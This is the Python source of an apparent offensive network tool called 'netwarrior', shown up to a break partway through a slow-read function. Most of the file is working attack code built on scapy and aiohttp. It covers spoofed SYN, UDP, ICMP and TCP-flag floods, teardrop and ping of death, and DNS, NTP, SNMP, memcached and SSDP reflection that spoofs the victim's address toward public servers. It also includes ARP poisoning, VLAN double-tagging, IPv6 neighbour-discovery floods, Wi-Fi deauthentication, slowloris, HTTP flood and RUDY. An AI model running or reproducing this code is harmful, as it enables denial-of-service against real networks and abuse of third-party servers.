import os
import sys
import time
import socket
import struct
import random
import threading
import subprocess
import json
import ipaddress
import hashlib
import base64
import platform
import collections
import datetime
import math
import traceback
import select
import tempfile
import itertools
import asyncio
import aiohttp
import functools
from typing import Optional, Dict, List, Tuple, Any, Callable, Iterable
from dataclasses import dataclass, field
from concurrent.futures import ThreadPoolExecutor
from pathlib import Path
import tomli_w
import tomli
import sys as _sys
_UVLOOP = False
if _sys.platform != "win32":
    try:
        import uvloop
        _UVLOOP = True
    except ImportError:
        pass
import psutil
import paramiko
import dns.resolver
import dns.reversename
import dns.zone
import dns.query
from io import StringIO

# Rich
from rich.console import Console, Group
from rich.table import Table
from rich.panel import Panel
from rich.layout import Layout
from rich.live import Live
from rich.text import Text
from rich import box
from rich.prompt import Prompt, Confirm
from rich.progress import Progress, SpinnerColumn, TextColumn
from rich.syntax import Syntax
from rich.tree import Tree

# Scapy
from scapy.all import (
    IP, TCP, UDP, ICMP, Ether, ARP, send, sendp, sniff, srp, sr1,
    wrpcap, rdpcap, fragment, defragment, Dot1Q, GRE, SCTP, SCTPChunkInit,
    IPv6, ICMPv6ND_NA, ICMPv6ND_RA, ICMPv6ND_NS, ICMPv6NDOptSrcLLAddr,
    IPv6ExtHdrHopByHop, DNS, DNSQR, DNSRR, RadioTap, Dot11, Dot11Deauth,
    Dot11Beacon, Dot11Elt, LLC, Raw, EAPOL
)

console = Console()

# ──────────────────────────────────────────────────────────────────────────────
# DEPENDENCY CHECK – correct import names only
# ──────────────────────────────────────────────────────────────────────────────
def check_deps():
    missing = []
    for pkg in ["rich", "scapy", "psutil", "paramiko", "dns", "aiohttp", "tomli", "tomli_w"]:
        try:
            __import__(pkg)
        except ImportError:
            missing.append(pkg)
    if missing:
        console.print(f"[red]Missing: {', '.join(missing)}. Install with pip.[/]")
        sys.exit(1)
check_deps()

# ──────────────────────────────────────────────────────────────────────────────
# UTILITY
# ──────────────────────────────────────────────────────────────────────────────
class Utils:
    @staticmethod
    def rand_ip():
        return f"{random.randint(1,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
    @staticmethod
    def rand_ipv6():
        return ":".join(f"{random.randint(0,0xffff):x}" for _ in range(8))
    @staticmethod
    def rand_mac():
        return ":".join(f"{random.randint(0,255):02x}" for _ in range(6))
    @staticmethod
    def rand_port():
        return random.randint(1024, 65535)
    @staticmethod
    def rand_payload(size=512):
        return os.urandom(size)
    @staticmethod
    def human_size(size):
        for unit in ['B','KB','MB','GB','TB']:
            if size < 1024:
                return f"{size:.2f} {unit}"
            size /= 1024
        return f"{size:.2f} PB"
    @staticmethod
    def format_duration(seconds):
        m, s = divmod(int(seconds), 60)
        h, m = divmod(m, 60)
        if h: return f"{h}h {m}m {s}s"
        if m: return f"{m}m {s}s"
        return f"{s}s"
    @staticmethod
    def get_hostname(ip):
        try:
            return socket.gethostbyaddr(ip)[0]
        except Exception:
            return None
    @staticmethod
    def get_mac(ip):
        try:
            ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=2, verbose=0)
            if ans:
                return ans[0][1].hwsrc
        except Exception:
            pass
        return None
    @staticmethod
    def get_default_gateway():
        try:
            if platform.system() == "Linux":
                out = subprocess.check_output(["ip", "route", "show", "default"], stderr=subprocess.DEVNULL, text=True)
                parts = out.split()
                if "via" in parts:
                    return parts[parts.index("via") + 1]
            elif platform.system() == "Windows":
                out = subprocess.check_output(["route", "print", "0.0.0.0"], stderr=subprocess.DEVNULL, text=True)
                for line in out.splitlines():
                    if "0.0.0.0" in line and "Gateway" not in line:
                        parts = line.split()
                        if len(parts) >= 3 and parts[0] == "0.0.0.0":
                            return parts[2]
            elif platform.system() == "Darwin":
                out = subprocess.check_output(["netstat", "-rn"], stderr=subprocess.DEVNULL, text=True)
                for line in out.splitlines():
                    if "default" in line and "UG" in line:
                        parts = line.split()
                        if len(parts) >= 2:
                            return parts[1]
        except Exception:
            pass
        return "192.168.1.1"

# ──────────────────────────────────────────────────────────────────────────────
# CONFIG & STATE
# ──────────────────────────────────────────────────────────────────────────────
class Config:
    def __init__(self):
        self.max_pps = 10000
        self.safe_mode = False
        self.default_duration = 30
        self.interface = None
        self.output_dir = Path("reports")
        self.log_level = "INFO"
        self.dns_servers = ["8.8.8.8", "1.1.1.1"]
        self.ssh_timeout = 5.0
        self.http_timeout = 10.0
        self._path = Path.home() / ".config/netwarrior/config.toml"
        self.load()

    def load(self):
        if self._path.exists():
            try:
                with open(self._path, "rb") as f:
                    data = tomli.load(f)
                for k, v in data.items():
                    if hasattr(self, k):
                        setattr(self, k, v)
            except Exception:
                pass

    def save(self):
        self._path.parent.mkdir(parents=True, exist_ok=True)
        data = {k: v for k, v in self.__dict__.items() if not k.startswith("_")}
        for k, v in data.items():
            if isinstance(v, Path):
                data[k] = str(v)
        with open(self._path, "wb") as f:
            tomli_w.dump(data, f)

class NetworkContext:
    def __init__(self):
        self.ip = "0.0.0.0"
        self.mac = "00:00:00:00:00:00"
        self.gateway = "192.168.1.1"
        self.interface = "eth0"
        self.netmask = "255.255.255.0"
        self.dns_servers = ["8.8.8.8"]
        self._detect()

    def _detect(self):
        addrs = psutil.net_if_addrs()
        stats = psutil.net_if_stats()
        for name, snics in addrs.items():
            if name in stats and stats[name].isup and not name.startswith(("lo", "Loopback")):
                for a in snics:
                    if a.family == socket.AF_INET and not a.address.startswith("127."):
                        self.ip = a.address
                        self.netmask = a.netmask or "255.255.255.0"
                        self.interface = name
                    elif hasattr(psutil, "AF_LINK") and a.family == psutil.AF_LINK:
                        self.mac = a.address
                if self.ip != "0.0.0.0":
                    break
        if self.ip == "0.0.0.0":
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.connect(("8.8.8.8", 53))
                self.ip = s.getsockname()[0]
                s.close()
            except Exception:
                pass
        self.gateway = Utils.get_default_gateway()
        try:
            with open('/etc/resolv.conf', 'r') as f:
                dns = [line.split()[1] for line in f if line.startswith('nameserver')]
                if dns:
                    self.dns_servers = dns
        except Exception:
            pass

@dataclass
class AttackState:
    name: str
    running: bool = True
    packets_sent: int = 0
    packets_recv: int = 0
    bytes_sent: int = 0
    bytes_recv: int = 0
    start_time: float = field(default_factory=time.time)
    end_time: Optional[float] = None
    errors: int = 0
    findings: List[Dict] = field(default_factory=list)
    _lock: threading.Lock = field(default_factory=threading.Lock)

    def inc_sent(self, n=1):
        with self._lock:
            self.packets_sent += n
    def inc_recv(self, n=1):
        with self._lock:
            self.packets_recv += n
    def inc_bytes_sent(self, n):
        with self._lock:
            self.bytes_sent += n
    def inc_bytes_recv(self, n):
        with self._lock:
            self.bytes_recv += n
    def inc_errors(self, n=1):
        with self._lock:
            self.errors += n
    def add_finding(self, f):
        with self._lock:
            self.findings.append(f)
    def stop(self):
        self.running = False
        self.end_time = time.time()

class AttackRegistry:
    def __init__(self):
        self._attacks: Dict[str, AttackState] = {}
        self._lock = threading.Lock()
    def create(self, name) -> AttackState:
        with self._lock:
            att = AttackState(name=name)
            self._attacks[name] = att
            return att
    def get(self, name):
        with self._lock:
            return self._attacks.get(name)
    def stop_all(self):
        with self._lock:
            for a in self._attacks.values():
                a.stop()
            self._attacks.clear()
    def active(self):
        with self._lock:
            return [n for n,a in self._attacks.items() if a.running]
    def total_packets(self):
        with self._lock:
            return sum(a.packets_sent for a in self._attacks.values())

class LogBus:
    def __init__(self, maxlen=500):
        self.logs = collections.deque(maxlen=maxlen)
        self._lock = threading.Lock()
    def add(self, msg, level="info", tag=""):
        with self._lock:
            self.logs.append({
                "time": datetime.datetime.now().strftime("%H:%M:%S"),
                "level": level,
                "tag": tag,
                "msg": msg
            })
    def get(self, n=50):
        with self._lock:
            return list(self.logs)[-n:]

# ──────────────────────────────────────────────────────────────────────────────
# ENGINE
# ──────────────────────────────────────────────────────────────────────────────
class RateLimiter:
    def __init__(self, rate: int):
        self.rate = rate
        self.tokens = rate
        self.last = asyncio.get_running_loop().time()
        self._lock = asyncio.Lock()
    async def acquire(self, n=1):
        if self.rate <= 0:
            return
        async with self._lock:
            now = asyncio.get_running_loop().time()
            elapsed = now - self.last
            self.tokens = min(self.rate, self.tokens + elapsed * self.rate)
            self.last = now
            if self.tokens >= n:
                self.tokens -= n
                return
            need = n - self.tokens
            await asyncio.sleep(need / self.rate)
            self.tokens = 0
            self.last = asyncio.get_running_loop().time()

class AttackEngine:
    def __init__(self, config: Config, registry: AttackRegistry, log: LogBus, net: NetworkContext):
        self.config = config
        self.registry = registry
        self.log = log
        self.net = net
        self._stop = asyncio.Event()
        self._loop = asyncio.get_running_loop()

    def stop(self):
        self._stop.set()

    async def send_packet(self, packet, count=1, pps=None, layer2=False, attack_name=""):
        if pps is None:
            pps = self.config.max_pps
        limiter = RateLimiter(pps)
        sent = 0
        for _ in range(count):
            if self._stop.is_set():
                break
            await limiter.acquire(1)
            try:
                if layer2:
                    sendp(packet, verbose=0)
                else:
                    send(packet, verbose=0)
                sent += 1
            except Exception:
                if attack_name:
                    att = self.registry.get(attack_name)
                    if att:
                        att.inc_errors()
        if attack_name:
            att = self.registry.get(attack_name)
            if att:
                att.inc_sent(sent)
        return sent

    async def send_loop(self, packet_gen: Iterable, duration: float, pps: int,
                        attack_name: str, layer2: bool = False):
        limiter = RateLimiter(pps)
        deadline = asyncio.get_running_loop().time() + duration
        att = self.registry.get(attack_name)
        for pkt in packet_gen:
            if self._stop.is_set() or not att or not att.running or asyncio.get_running_loop().time() >= deadline:
                break
            await limiter.acquire(1)
            try:
                if layer2:
                    sendp(pkt, verbose=0)
                else:
                    send(pkt, verbose=0)
                att.inc_sent(1)
            except Exception:
                att.inc_errors()
        if att:
            att.stop()

# ──────────────────────────────────────────────────────────────────────────────
# ATTACKS – ALL 50+ (with unified signatures)
# ──────────────────────────────────────────────────────────────────────────────
class Attacks:
    def __init__(self, engine: AttackEngine, registry: AttackRegistry, log: LogBus, net: NetworkContext):
        self.engine = engine
        self.registry = registry
        self.log = log
        self.net = net

    # ---- Floods ----
    async def syn_flood(self, target, port=80, duration=30, pps=1000, **kwargs):
        name = f"syn_{target}_{port}"
        att = self.registry.create(name)
        self.log.add(f"SYN flood {target}:{port} @ {pps} pps", tag="ATTACK")
        def gen():
            while True:
                yield IP(src=Utils.rand_ip(), dst=target) / TCP(
                    sport=Utils.rand_port(), dport=port, flags="S",
                    seq=random.randint(0,4294967295), window=random.randint(1024,65535)
                )
        await self.engine.send_loop(gen(), duration, pps, name)
        return att

    async def udp_flood(self, target, port=80, duration=30, pps=1000, size=512, **kwargs):
        name = f"udp_{target}_{port}"
        att = self.registry.create(name)
        self.log.add(f"UDP flood {target}:{port} @ {pps} pps", tag="ATTACK")
        def gen():
            while True:
                yield IP(src=Utils.rand_ip(), dst=target) / UDP(sport=Utils.rand_port(), dport=port) / Utils.rand_payload(size)
        await self.engine.send_loop(gen(), duration, pps, name)
        return att

    async def icmp_flood(self, target, duration=30, pps=1000, **kwargs):
        name = f"icmp_{target}"
        att = self.registry.create(name)
        self.log.add(f"ICMP flood {target} @ {pps} pps", tag="ATTACK")
        def gen():
            while True:
                yield IP(src=Utils.rand_ip(), dst=target) / ICMP() / Utils.rand_payload(56)
        await self.engine.send_loop(gen(), duration, pps, name)
        return att

    async def tcp_ack_flood(self, target, port=80, duration=30, pps=1000, **kwargs):
        name = f"tcp_ack_{target}_{port}"
        att = self.registry.create(name)
        self.log.add(f"TCP ACK flood {target}:{port} @ {pps} pps", tag="ATTACK")
        def gen():
            while True:
                yield IP(src=Utils.rand_ip(), dst=target) / TCP(
                    sport=Utils.rand_port(), dport=port, flags="A",
                    seq=random.randint(0,4294967295), ack=random.randint(0,4294967295)
                )
        await self.engine.send_loop(gen(), duration, pps, name)
        return att

    async def tcp_rst_flood(self, target, port=80, duration=30, pps=1000, **kwargs):
        name = f"tcp_rst_{target}_{port}"
        att = self.registry.create(name)
        self.log.add(f"TCP RST flood {target}:{port} @ {pps} pps", tag="ATTACK")
        def gen():
            while True:
                yield IP(src=Utils.rand_ip(), dst=target) / TCP(
                    sport=Utils.rand_port(), dport=port, flags="R",
                    seq=random.randint(0,4294967295)
                )
        await self.engine.send_loop(gen(), duration, pps, name)
        return att

    async def tcp_xmas_flood(self, target, port=80, duration=30, pps=1000, **kwargs):
        name = f"tcp_xmas_{target}_{port}"
        att = self.registry.create(name)
        self.log.add(f"TCP XMAS flood {target}:{port} @ {pps} pps", tag="ATTACK")
        def gen():
            while True:
                yield IP(src=Utils.rand_ip(), dst=target) / TCP(
                    sport=Utils.rand_port(), dport=port, flags="FPU",
                    seq=random.randint(0,4294967295)
                )
        await self.engine.send_loop(gen(), duration, pps, name)
        return att

    async def tcp_null_flood(self, target, port=80, duration=30, pps=1000, **kwargs):
        name = f"tcp_null_{target}_{port}"
        att = self.registry.create(name)
        self.log.add(f"TCP NULL flood {target}:{port} @ {pps} pps", tag="ATTACK")
        def gen():
            while True:
                yield IP(src=Utils.rand_ip(), dst=target) / TCP(
                    sport=Utils.rand_port(), dport=port, flags=0,
                    seq=random.randint(0,4294967295)
                )
        await self.engine.send_loop(gen(), duration, pps, name)
        return att

    async def tcp_fin_flood(self, target, port=80, duration=30, pps=1000, **kwargs):
        name = f"tcp_fin_{target}_{port}"
        att = self.registry.create(name)
        self.log.add(f"TCP FIN flood {target}:{port} @ {pps} pps", tag="ATTACK")
        def gen():
            while True:
                yield IP(src=Utils.rand_ip(), dst=target) / TCP(
                    sport=Utils.rand_port(), dport=port, flags="F",
                    seq=random.randint(0,4294967295)
                )
        await self.engine.send_loop(gen(), duration, pps, name)
        return att

    async def tcp_zero_window(self, target, port=80, duration=30, pps=1000, **kwargs):
        name = f"tcp_zero_{target}_{port}"
        att = self.registry.create(name)
        self.log.add(f"TCP Zero-Window {target}:{port} @ {pps} pps", tag="ATTACK")
        def gen():
            while True:
                yield IP(src=Utils.rand_ip(), dst=target) / TCP(
                    sport=Utils.rand_port(), dport=port, flags="A", window=0,
                    seq=random.randint(0,4294967295)
                )
        await self.engine.send_loop(gen(), duration, pps, name)
        return att

    async def mac_flood(self, target, duration=30, pps=1000, **kwargs):
        name = f"mac_{target}"
        att = self.registry.create(name)
        self.log.add(f"MAC flood {target} @ {pps} pps", tag="ATTACK")
        def gen():
            while True:
                yield Ether(src=Utils.rand_mac(), dst="ff:ff:ff:ff:ff:ff") / \
                      IP(src=Utils.rand_ip(), dst=target) / TCP(sport=Utils.rand_port(), dport=Utils.rand_port())
        await self.engine.send_loop(gen(), duration, pps, name, layer2=True)
        return att

    async def smurf(self, target, broadcast=None, duration=30, pps=1000, **kwargs):
        if broadcast is None:
            try:
                net = ipaddress.IPv4Network(f"{target}/24", strict=False)
                broadcast = str(net.broadcast_address)
            except Exception:
                broadcast = "255.255.255.255"
        name = f"smurf_{target}"
        att = self.registry.create(name)
        self.log.add(f"Smurf {target} via {broadcast} @ {pps} pps", tag="ATTACK")
        def gen():
            while True:
                yield IP(src=target, dst=broadcast) / ICMP() / Utils.rand_payload(56)
        await self.engine.send_loop(gen(), duration, pps, name)
        return att

    async def land(self, target, port=80, duration=30, pps=1000, **kwargs):
        name = f"land_{target}_{port}"
        att = self.registry.create(name)
        self.log.add(f"LAND {target}:{port} @ {pps} pps", tag="ATTACK")
        def gen():
            while True:
                yield IP(src=target, dst=target) / TCP(
                    sport=port, dport=port, flags="S",
                    seq=random.randint(0,4294967295)
                )
        await self.engine.send_loop(gen(), duration, pps, name)
        return att

    async def sctp_init_flood(self, target, port=80, duration=30, pps=1000, **kwargs):
        name = f"sctp_{target}_{port}"
        att = self.registry.create(name)
        self.log.add(f"SCTP INIT flood {target}:{port} @ {pps} pps", tag="ATTACK")
        def gen():
            while True:
                yield IP(src=Utils.rand_ip(), dst=target) / SCTP(
                    sport=Utils.rand_port(), dport=port, tag=Utils.rand_port()
                ) / SCTPChunkInit(init_tag=Utils.rand_port(), a_rwnd=65535,
                                  num_outbound=1, num_inbound=1, init_tsn=Utils.rand_port())
        await self.engine.send_loop(gen(), duration, pps, name)
        return att

    async def teardrop(self, target, duration=30, pps=100, **kwargs):
        name = f"teardrop_{target}"
        att = self.registry.create(name)
        self.log.add(f"Teardrop {target} @ {pps} pps", tag="ATTACK")
        def gen():
            while True:
                ip = IP(src=Utils.rand_ip(), dst=target, id=random.randint(1,65535))
                pkt = ip / Utils.rand_payload(2000)
                frags = fragment(pkt, fragsize=500)
                for f in frags:
                    yield f
        await self.engine.send_loop(gen(), duration, pps, name)
        return att

    async def ping_of_death(self, target, duration=30, pps=100, **kwargs):
        name = f"pod_{target}"
        att = self.registry.create(name)
        self.log.add(f"Ping of Death {target} @ {pps} pps", tag="ATTACK")
        def gen():
            while True:
                yield IP(src=Utils.rand_ip(), dst=target) / ICMP() / Utils.rand_payload(65535)
        await self.engine.send_loop(gen(), duration, pps, name)
        return att

    # ---- Amplification ----
    async def dns_amp(self, target, duration=30, pps=500, **kwargs):
        name = f"dns_amp_{target}"
        att = self.registry.create(name)
        self.log.add(f"DNS amplification {target}", tag="AMP")
        servers = ["8.8.8.8","1.1.1.1","9.9.9.9","208.67.222.222"]
        queries = [
            b"\x12\x34\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x07example\x03com\x00\x00\xff\x00\x01",
            b"\x12\x34\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x06google\x03com\x00\x00\xff\x00\x01",
        ]
        def gen():
            while True:
                server = random.choice(servers)
                q = random.choice(queries)
                yield IP(src=target, dst=server) / UDP(sport=Utils.rand_port(), dport=53) / Raw(q)
        await self.engine.send_loop(gen(), duration, pps, name)
        return att

    async def ntp_amp(self, target, duration=30, pps=500, **kwargs):
        name = f"ntp_amp_{target}"
        att = self.registry.create(name)
        self.log.add(f"NTP amplification {target}", tag="AMP")
        servers = ["pool.ntp.org","time.nist.gov","time.cloudflare.com","time.google.com"]
        ntp_payload = b"\x17\x00\x03\x2a" + b"\x00"*4
        def gen():
            while True:
                server = random.choice(servers)
                yield IP(src=target, dst=server) / UDP(sport=Utils.rand_port(), dport=123) / Raw(ntp_payload)
        await self.engine.send_loop(gen(), duration, pps, name)
        return att

    async def snmp_amp(self, target, duration=30, pps=500, **kwargs):
        name = f"snmp_amp_{target}"
        att = self.registry.create(name)
        self.log.add(f"SNMP amplification {target}", tag="AMP")
        servers = ["1.1.1.1","8.8.8.8"]
        snmp_payload = bytes.fromhex("302e02010104067075626c6963a527020404e9e1a7020100020100301b300f060b2b0601020101010500300c06082b060102010105000500")
        def gen():
            while True:
                server = random.choice(servers)
                yield IP(src=target, dst=server) / UDP(sport=Utils.rand_port(), dport=161) / Raw(snmp_payload)
        await self.engine.send_loop(gen(), duration, pps, name)
        return att

    async def memcached_amp(self, target, duration=30, pps=500, **kwargs):
        name = f"memcached_amp_{target}"
        att = self.registry.create(name)
        self.log.add(f"Memcached amplification {target}", tag="AMP")
        payload = b"\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n"
        servers = [self.net.gateway, "8.8.8.8"]
        def gen():
            while True:
                server = random.choice(servers)
                yield IP(src=target, dst=server) / UDP(sport=Utils.rand_port(), dport=11211) / Raw(payload)
        await self.engine.send_loop(gen(), duration, pps, name)
        return att

    async def ssdp_amp(self, target, duration=30, pps=500, **kwargs):
        name = f"ssdp_amp_{target}"
        att = self.registry.create(name)
        self.log.add(f"SSDP amplification {target}", tag="AMP")
        ssdp = b"M-SEARCH * HTTP/1.1\r\nHost: 239.255.255.250:1900\r\nMan: \"ssdp:discover\"\r\nMX: 3\r\nST: ssdp:all\r\n\r\n"
        def gen():
            while True:
                yield IP(src=target, dst="239.255.255.250") / UDP(sport=Utils.rand_port(), dport=1900) / Raw(ssdp)
        await self.engine.send_loop(gen(), duration, pps, name)
        return att

    async def chargen_amp(self, target, duration=30, pps=500, **kwargs):
        name = f"chargen_amp_{target}"
        att = self.registry.create(name)
        self.log.add(f"CHARGEN amplification {target}", tag="AMP")
        servers = [self.net.gateway, "8.8.8.8"]
        def gen():
            while True:
                server = random.choice(servers)
                yield IP(src=target, dst=server) / UDP(sport=Utils.rand_port(), dport=19) / Raw(b"X")
        await self.engine.send_loop(gen(), duration, pps, name)
        return att

    async def ssdp_discovery(self, duration=30, **kwargs):
        name = "ssdp_discovery"
        att = self.registry.create(name)
        self.log.add("SSDP discovery", tag="RECON")
        ssdp = b"M-SEARCH * HTTP/1.1\r\nHost: 239.255.255.250:1900\r\nMan: \"ssdp:discover\"\r\nMX: 2\r\nST: ssdp:all\r\n\r\n"
        def gen():
            while True:
                yield IP(dst="239.255.255.250") / UDP(sport=1900, dport=1900) / Raw(ssdp)
        await self.engine.send_loop(gen(), duration, 10, name)
        return att

    async def radius_pod(self, duration=30, **kwargs):
        name = "radius_pod"
        att = self.registry.create(name)
        self.log.add("RADIUS PoD broadcast", tag="ATTACK")
        payload = b"\x28" + b"\x00\x00\x18" + b"\x00"*16 + b"0"*4 + b"\x00\x00\x00\x01"
        def gen():
            while True:
                yield IP(src=Utils.rand_ip(), dst="255.255.255.255") / UDP(sport=Utils.rand_port(), dport=3799) / Raw(payload)
        await self.engine.send_loop(gen(), duration, 10, name)
        return att

    # ---- Layer 2 ----
    async def arp_poison(self, target, gateway=None, duration=30, **kwargs):
        if gateway is None:
            gateway = self.net.gateway
        name = f"arp_poison_{target}"
        att = self.registry.create(name)
        self.log.add(f"ARP poison {target} <-> {gateway}", tag="MITM")
        target_mac = Utils.get_mac(target)
        gw_mac = Utils.get_mac(gateway)
        if not target_mac or not gw_mac:
            self.log.add("Could not get MACs", level="error")
            att.stop()
            return att
        def gen():
            while True:
                pkt1 = Ether(dst=target_mac, src=self.net.mac) / ARP(op=2, pdst=target, hwdst=target_mac, psrc=gateway, hwsrc=self.net.mac)
                pkt2 = Ether(dst=gw_mac, src=self.net.mac) / ARP(op=2, pdst=gateway, hwdst=gw_mac, psrc=target, hwsrc=self.net.mac)
                yield pkt1
                yield pkt2
        await self.engine.send_loop(gen(), duration, 10, name, layer2=True)
        return att

    async def vlan_double_tag(self, target, target_vlan=10, duration=30, pps=1000, **kwargs):
        name = f"vlan_{target}_{target_vlan}"
        att = self.registry.create(name)
        self.log.add(f"VLAN double-tag {target} VLAN {target_vlan}", tag="L2")
        def gen():
            while True:
                yield Ether() / Dot1Q(vlan=1) / Dot1Q(vlan=target_vlan) / IP(dst=target) / TCP(dport=80, flags="S")
        await self.engine.send_loop(gen(), duration, pps, name, layer2=True)
        return att

    async def l2_protocol_flood(self, proto_type, duration=30, pps=1000, **kwargs):
        name = f"l2_{proto_type}"
        att = self.registry.create(name)
        self.log.add(f"L2 {proto_type} flood", tag="L2")
        def gen():
            while True:
                if proto_type == "cdp":
                    yield Ether(dst="01:00:0c:cc:cc:cc", type=0x2000) / Utils.rand_payload(64)
                elif proto_type == "lldp":
                    yield Ether(dst="01:80:c2:00:00:0e", type=0x88cc) / Utils.rand_payload(64)
                elif proto_type == "stp":
                    stp = b"\x00\x00\x00\x00\x42\x42\x03" + Utils.rand_payload(40)
                    yield Ether(dst="01:80:c2:00:00:00") / LLC(dsap=0x42, ssap=0x42, ctrl=3) / Raw(stp)
                else:
                    break
        await self.engine.send_loop(gen(), duration, pps, name, layer2=True)
        return att

    # ---- IPv6 ----
    async def ipv6_ra_flood(self, target, duration=30, pps=1000, **kwargs):
        name = f"ipv6_ra_{target}"
        att = self.registry.create(name)
        self.log.add(f"IPv6 RA flood {target}", tag="IPV6")
        def gen():
            while True:
                yield IPv6(dst="ff02::1") / ICMPv6ND_RA(R=0, S=1, O=1, lifetime=9000, retranstimer=1000) / ICMPv6NDOptSrcLLAddr(lladdr=Utils.rand_mac())
        await self.engine.send_loop(gen(), duration, pps, name)
        return att

    async def ipv6_na_flood(self, target, duration=30, pps=1000, **kwargs):
        name = f"ipv6_na_{target}"
        att = self.registry.create(name)
        self.log.add(f"IPv6 NA flood {target}", tag="IPV6")
        def gen():
            while True:
                yield IPv6(dst=target) / ICMPv6ND_NA(R=1, S=1, O=1, tgt=Utils.rand_ipv6()) / ICMPv6NDOptSrcLLAddr(lladdr=Utils.rand_mac())
        await self.engine.send_loop(gen(), duration, pps, name)
        return att

    async def ipv6_ns_flood(self, target, duration=30, pps=1000, **kwargs):
        name = f"ipv6_ns_{target}"
        att = self.registry.create(name)
        self.log.add(f"IPv6 NS flood {target}", tag="IPV6")
        def gen():
            while True:
                yield IPv6(dst=target) / ICMPv6ND_NS(tgt=Utils.rand_ipv6()) / ICMPv6NDOptSrcLLAddr(lladdr=Utils.rand_mac())
        await self.engine.send_loop(gen(), duration, pps, name)
        return att

    # ---- Wireless ----
    async def deauth(self, bssid, client="ff:ff:ff:ff:ff:ff", iface="wlan0mon", duration=30, **kwargs):
        name = f"deauth_{bssid}"
        att = self.registry.create(name)
        self.log.add(f"Deauth {bssid} -> {client}", tag="WIFI")
        def gen():
            while True:
                yield RadioTap() / Dot11(addr1=client, addr2=bssid, addr3=bssid) / Dot11Deauth(reason=7)
        await self.engine.send_loop(gen(), duration, 100, name, layer2=True)
        return att

    async def beacon_flood(self, ssids=None, iface="wlan0mon", duration=30, **kwargs):
        if ssids is None:
            ssids = ["FreeWiFi","Guest","Public","NetWARRIOR","Open","SecureNet"]
        name = "beacon_flood"
        att = self.registry.create(name)
        self.log.add(f"Beacon flood {len(ssids)} SSIDs", tag="WIFI")
        def gen():
            while True:
                for ssid in ssids:
                    yield RadioTap() / Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=Utils.rand_mac(), addr3=Utils.rand_mac()) / Dot11Beacon(cap="ESS") / Dot11Elt(ID="SSID", info=ssid.encode())
        await self.engine.send_loop(gen(), duration, 100, name, layer2=True)
        return att

    # ---- GRE ----
    async def gre_ip_spoof(self, target, payload_size=64, duration=30, pps=1000, **kwargs):
        name = f"gre_{target}"
        att = self.registry.create(name)
        self.log.add(f"GRE spoof {target}", tag="ATTACK")
        def gen():
            while True:
                yield IP(src=Utils.rand_ip(), dst=target) / GRE(proto=0x0800) / IP(src=Utils.rand_ip(), dst=target) / Utils.rand_payload(payload_size)
        await self.engine.send_loop(gen(), duration, pps, name)
        return att

    # ---- PCAP replay ----
    async def replay_pcap(self, pcap_file, duration=30, pps=1000, **kwargs):
        name = "pcap_replay"
        att = self.registry.create(name)
        if not os.path.isfile(pcap_file):
            self.log.add(f"PCAP file not found: {pcap_file}", level="error")
            att.stop()
            return att
        try:
            packets = rdpcap(pcap_file)
            if not packets:
                self.log.add("PCAP empty", level="error")
                att.stop()
                return att
            self.log.add(f"Replaying {pcap_file} ({len(packets)} packets)", tag="ATTACK")
            def gen():
                while True:
                    for pkt in packets:
                        yield pkt
            await self.engine.send_loop(gen(), duration, pps, name)
        except Exception as e:
            self.log.add(f"Replay error: {e}", level="error")
            att.stop()
        return att

    # ---- Application Layer ----
    async def slowloris(self, target, port=80, socket_count=200, duration=30, **kwargs):
        name = f"slowloris_{target}_{port}"
        att = self.registry.create(name)
        self.log.add(f"Slowloris {target}:{port} with {socket_count} sockets", tag="APP")
        sockets = []
        deadline = asyncio.get_running_loop().time() + duration
        for _ in range(socket_count):
            try:
                reader, writer = await asyncio.open_connection(target, port)
                writer.write(
                    f"GET /?{random.randint(0,9999)} HTTP/1.1\r\n"
                    f"Host: {target}\r\n"
                    f"User-Agent: Mozilla/5.0\r\n"
                    f"Accept-language: en-US\r\n"
                .encode())
                await writer.drain()
                sockets.append(writer)
                att.inc_sent(1)
            except Exception:
                pass
        while not self.engine._stop.is_set() and att.running and asyncio.get_running_loop().time() < deadline:
            for writer in sockets[:]:
                try:
                    writer.write(f"X-a: {random.randint(1,5000)}\r\n".encode())
                    await writer.drain()
                    att.inc_sent(1)
                except Exception:
                    sockets.remove(writer)
                    try: writer.close()
                    except Exception: pass
            await asyncio.sleep(15)
        for writer in sockets:
            try: writer.close()
            except Exception: pass
        att.stop()
        return att

    async def http_flood(self, target, port=80, threads=20, duration=30, **kwargs):
        name = f"http_flood_{target}_{port}"
        att = self.registry.create(name)
        self.log.add(f"HTTP flood {target}:{port} with {threads} threads", tag="APP")
        urls = ["/","/index.html","/login","/api","/search?q=test","/about","/contact"]
        async def worker():
            async with aiohttp.ClientSession() as session:
                while not self.engine._stop.is_set() and att.running and asyncio.get_running_loop().time() < deadline:
                    try:
                        url = f"http://{target}:{port}{random.choice(urls)}"
                        async with session.get(url, timeout=5) as resp:
                            await resp.read()
                        att.inc_sent(1)
                    except Exception:
                        pass
        deadline = asyncio.get_running_loop().time() + duration
        tasks = [asyncio.create_task(worker()) for _ in range(threads)]
        await asyncio.gather(*tasks, return_exceptions=True)
        att.stop()
        return att

    async def rudy_attack(self, target, port=80, duration=30, sockets=20, **kwargs):
        name = "rudy"
        att = self.registry.create(name)
        url = f"http://{target}:{port}/"
        self.log.add(f"RUDY attack {url}", tag="APP")
        async def worker():
            async with aiohttp.ClientSession() as session:
                try:
                    await session.get(url, timeout=5)
                except Exception:
                    pass
                data = {"username": ""}
                while not self.engine._stop.is_set() and att.running and asyncio.get_running_loop().time() < deadline:
                    try:
                        async with session.post(url, data=data, timeout=10) as resp:
                            await resp.content.read(1)
                            await asyncio.sleep(10)
                        att.inc_sent(1)
                    except Exception:
                        pass
        deadline = asyncio.get_running_loop().time() + duration
        tasks = [asyncio.create_task(worker()) for _ in range(sockets)]
        await asyncio.gather(*tasks, return_exceptions=True)
        att.stop()
        return att

    async def slow_read(self, target, port=80, duration=30, sockets=20, **kwargs):
        name = f"slow_read_{target}_{port}"
        att = self.registry.create(name)
        self.log.add(f"Slow Read {target}:{port}", tag="APP")
        socks = []
        for _ in range(sockets):
            try:
                reader, writer = await asyncio.open_connection(target, port)
